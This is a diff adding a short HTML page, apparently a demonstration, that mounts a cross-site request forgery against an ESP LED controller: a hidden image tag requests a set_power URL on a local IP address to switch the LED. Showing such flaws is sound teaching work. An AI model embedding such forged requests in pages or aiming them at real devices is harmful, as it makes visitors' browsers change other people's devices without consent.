@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <h1>This is an malicious page that will execute an CSRF attack</h1>
+        <p>Through the request of an image, it will make the call to the LED controller and turn on the LED</p>
+        <!-- 
+            Only a valid IP is needed, and a "state":
+                - 0 = LED Off
+                - 1 = LED On
+                
+            This will ask to receive that data, thereby making the call to the LED controller
+        -->
+        <img src="http://192.168.2.22/set_power?state=0" alt="Requested ESP LED controller">
+    </body>
+</html>
